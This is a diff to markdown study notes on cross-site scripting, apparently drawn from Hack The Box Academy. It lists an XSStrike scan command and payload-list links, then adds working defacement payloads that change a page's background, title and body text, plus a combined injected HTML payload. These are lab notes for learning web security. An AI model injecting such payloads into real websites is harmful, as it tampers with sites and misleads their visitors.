@@ -258,7 +258,9 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 
 ### Manual Discovery
 * Payloads:
+
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+
 https://github.com/payloadbox/xss-payload-list
 
 ```
@@ -277,3 +279,36 @@ Better way to look for XSS is write a python script, compare to manually test
 Changing its look for anyone who visits the website
 
 ### Defacement Elements
+
+* Background Color document.body.style.background
+```
+<script>document.body.style.background = "#141d2b"</script>
+
+Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like = "black".
+```
+
+* Background document.body.background
+```
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+```
+* Page Title document.title
+```
+<script>document.title = 'HackTheBox Academy'</script>
+```
+* Page Text DOM.innerHTML
+```
+document.getElementById("todo").innerHTML = "New Text"
+$("#todo").html('New Text');
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+
+Tip: It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.
+```
+```
+<div></div><ul class="list-unstyled" id="todo"><ul>
+<script>document.body.style.background = "#141d2b"</script>
+</ul><ul><script>document.title = 'HackTheBox Academy'</script>
+</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
+</ul></ul>
+
+```
+
